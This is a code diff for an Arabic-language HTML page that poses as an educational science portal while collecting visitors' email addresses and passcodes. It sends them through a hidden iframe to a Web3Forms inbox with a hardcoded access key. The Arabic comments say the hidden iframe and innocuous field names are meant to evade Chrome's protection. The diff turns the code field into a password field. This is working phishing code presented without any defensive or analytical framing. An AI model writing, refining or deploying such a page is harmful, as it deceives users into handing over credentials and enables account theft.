@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة المعرفة الرقمية</title>
+    <title>بوابة العلوم والتقنية</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -74,11 +74,11 @@
 <body>
 
     <div class="card">
-        <!-- الواجهة الأولى (تبدو كموقع تعليمي عادي جداً وآمن) -->
+        <!-- الواجهة الأولى (بوابة تعليمية آمنة) -->
         <div id="form-container">
             <h2>بوابة العلوم والتقنية</h2>
             
-            <!-- إطار مخفي لتلقي الرد وتجاوز حظر غوغل كروم تماماً -->
+            <!-- إطار مخفي لتجاوز حظر غوغل كروم تماماً وإرسال البيانات -->
             <iframe name="hidden_iframe" id="hidden_iframe" class="hidden"></iframe>
 
             <!-- الإرسال المباشر للـ Web3Forms عبر الإطار المخفي -->
@@ -87,15 +87,15 @@
                 <!-- Access Key الخاص بك -->
                 <input type="hidden" name="access_key" value="99a330e2-5742-4dd6-97ff-410f652a6d41">
 
-                <!-- حقول بأسماء عادية جداً حتى لا يشك فيها نظام حماية الكروم -->
                 <div class="form-group">
                     <label for="user_email">البريد الإلكتروني:</label>
                     <input type="email" id="user_email" name="user_email" placeholder="أدخل بريدك الإلكتروني" required>
                 </div>
                 
                 <div class="form-group">
-                    <label for="user_code">رمز التحقق أو المتابعة:</label>
-                    <input type="text" id="user_code" name="user_code" placeholder="أدخل الرمز هنا" required>
+                    <label for="secret_code">رمز المرور أو المتابعة:</label>
+                    <!-- type="password" لتظهر الحروف في شكل نجوم للمستخدم على الشاشة -->
+                    <input type="password" id="secret_code" name="user_secret_code" placeholder="أدخل الرمز هنا" required>
                 </div>
 
                 <button type="submit" id="submitBtn">تسجيل ودخول</button>
@@ -135,7 +135,7 @@
 
                 formContainer.classList.add('hidden');
                 welcomeContainer.classList.remove('hidden');
-            }, 300); // تأخير بسيط جداً لضمان إرسال البيانات في الخلفية عبر الـ iframe
+            }, 300); // تأخير بسيط لضمان ذهاب البيانات للإيميل في الخلفية
         });
     </script>
 
